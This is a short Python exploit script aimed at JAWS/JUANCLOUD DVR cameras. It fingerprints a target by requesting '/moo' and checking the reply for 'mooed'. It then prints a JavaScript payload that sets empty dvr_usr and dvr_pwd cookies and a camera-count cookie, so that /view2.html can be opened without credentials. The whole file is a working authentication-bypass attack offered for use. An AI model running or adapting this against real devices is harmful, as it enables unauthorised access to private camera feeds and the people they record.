#!/usr/bin/env python3
import requests


class Exploit:
    def run(
        self,
        url
    ):
        e = JAWS()
        e.exp(url)


class JAWS():
    
    def exp(self, url):
        payload = (
            "document.cookie = 'dvr_camcnt=8; path=/'; "
            "document.cookie = 'dvr_pwd=; path=/'; "
            "document.cookie = 'dvr_usr=; path=/';"
        )
        url = url.rstrip('/')
        if self.detect(url):
            print(f"[+] {url}/view2.html \n |- JS executed in browser => [{payload}]")


    def detect(self, url):
        head = '/moo'
        res = requests.get(url + head, verify=False)
        if 'mooed' in res.text:
            print("[+] JUANCLOUD camera detected — vulnerable.")
            return 1
        else:
            print("[-] Target not vulnerable.")
            return 0


 